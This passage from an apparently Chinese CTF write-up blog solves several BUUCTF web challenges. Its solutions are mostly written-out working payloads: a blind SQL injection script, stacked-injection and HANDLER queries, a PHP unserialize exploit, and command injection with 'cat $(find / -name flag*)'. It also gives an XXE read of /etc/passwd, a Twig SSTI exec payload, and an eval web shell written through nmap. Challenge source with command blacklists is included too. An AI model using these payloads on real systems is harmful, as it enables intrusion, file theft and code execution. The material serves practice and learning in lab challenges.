class="params">url</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span>                     <span class="comment">#接收结果</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):     <span class="comment">#flag一般不超过50个字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:  <span class="comment">#string.printable将给出所有的标点符号，数字，ascii_letters和空格</span></span><br><span class="line">            payload=<span class="string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="built_in">format</span>(num,<span class="built_in">ord</span>(i)) <span class="comment">#ord函数用来获取单个字符的ascii码</span></span><br><span class="line">            post = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">            result = requests.post(url=url,data=post)   <span class="comment">#提交post请求</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                flag += i   <span class="comment">#用flag接收盲注得到的结果</span></span><br><span class="line">                <span class="built_in">print</span>(flag) <span class="comment">#打印结果</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url=<span class="string">&#x27;http://935ab885-c359-48b2-8673-50710c1c3e72.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">    blind_sql(url)</span><br></pre></td></tr></table></figure><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>黑名单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject)</span><br></pre></td></tr></table></figure><p>尝试了大小写、注释、内联注释都没用</p><h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a><strong>堆叠注入：</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; show databases; #</span><br><span class="line">-1&#x27;; show tables from ctftraining; #</span><br><span class="line">-1&#x27;; show tables; #</span><br><span class="line">-1&#x27;; show columns from FlagHere  ; #</span><br></pre></td></tr></table></figure><p>最后得到字段FlagHere</p><p>这里用<strong>Handler</strong>读取</p><p>Handler open 打开一个表</p><p>Handler  read 读取</p><p>Handler close关闭</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1;</span><br><span class="line">Handler FlagHere open ;</span><br><span class="line">Handler FlagHere read first;</span><br><span class="line">Handler FlagHere close;</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>union select 1,2,3</p><p>逐个测试admin，发现username在第二个字段</p><p>联合注入<strong>创建一条临时数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>从上往下看，如果触发__construct方法，会赋值op&#x3D;1，并且调用process方法</p><p>再看process方法，如果op&#x3D;1，则会调用write()方法，把<em>Hello World!<em>写入</em>&#x2F;tmp&#x2F;tmpfile</em></p><p>而最后一行对get传参str进行了类型转换，并且反序列化，这并不是在创建对象，所以不会触发__construct方法</p><p>如果想要触发__destruct方法，必须使op&#x3D;2绕过if判断,调用process方法，进而调用read方法，再利用filename属性去读取flag.php</p><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$op</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op=<span class="variable">$op</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>(<span class="number">2</span>,<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>执行一下</p><p><img src="/../images/image-20231103193613731.png" alt="image-20231103193613731"></p><p>成功拿到flag</p><p><img src="/../images/image-20231103193653759.png" alt="image-20231103193653759"></p><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>打开环境</p><p><img src="/../images/image-20231216142312108.png" alt="image-20231216142312108"></p><p>啥也看不出来，抓个包</p><p><img src="/../images/image-20231216142354527.png" alt="image-20231216142354527"></p><p>func是函数，p是函数的参数</p><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=system&amp;p=whoami</span><br></pre></td></tr></table></figure><p>被过滤</p><p><img src="/../images/image-20231216142552487.png" alt="image-20231216142552487"></p><p>加个反斜杠，可以执行</p><p><img src="/../images/image-20231216142627523.png" alt="image-20231216142627523"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=\system&amp;p=cat $(find / -name flag*)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216142945673.png" alt="image-20231216142945673"></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>打开环境</p><p><img src="/../images/image-20231216143424625.png" alt="image-20231216143424625"></p><p>根据题目猜测是XXE</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216143833788.png" alt="image-20231216143833788"></p><p><img src="/../images/image-20231216143908742.png" alt="image-20231216143908742"></p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>打开环境</p><p><img src="/../images/image-20231216144112963.png" alt="image-20231216144112963"></p><p>flag</p><p><img src="/../images/image-20231216144446052.png" alt="image-20231216144446052"></p><p>id输入什么就会显示什么</p><p><img src="/../images/image-20231216144507177.png" alt="image-20231216144507177"></p><p>抓包看一下</p><p><img src="/../images/image-20231216144554296.png" alt="image-20231216144554296"></p><p>尝试一下有没有可能是SSTI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216144813734.png" alt="image-20231216144813734"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216150315186.png" alt="image-20231216150315186"></p><h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>打开环境</p><p><img src="/../images/image-20231217101352330.png" alt="image-20231217101352330"></p><p>是一个在线的namp网站</p><p>尝试写入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.php&#x27;</span><br></pre></td></tr></table></figure><p>被过滤</p><p><img src="/../images/image-20231217101549048.png" alt="image-20231217101549048"></p><p>phtml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>还是被过滤</p><p><img src="/../images/image-20231217101638457.png" alt="image-20231217101638457"></p><p>短标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;? echo @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="/../images/image-20231217101751551.png" alt="image-20231217101751551"></p><p><img src="/../images/image-20231217101924320.png" alt="image-20231217101924320"></p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>打开环境</p><p><img src="/../images/image-20231217104203705.png" alt="image-20231217104203705"></p><p>F12查看一下</p><p><img src="/../images/image-20231217104243867.png" alt="image-20231217104243867"></p><p>访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造序列化，利用命令执行即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">HelloPhp</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231217104538747.png" alt="image-20231217104538747"></p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>打开环境</p><p><img src="/../images/image-20231219204126482.png" alt="image-20231219204126482"></p><p>解码</p><p>两次base64+hex</p><p><img src="/../images/image-20231219204354996.png" alt="image-20231219204354996"></p><p>尝试对index.php进行相同编码</p><p><img src="/../images/image-20231219204524717.png" alt="image-20231219204524717"></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure><p>解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> 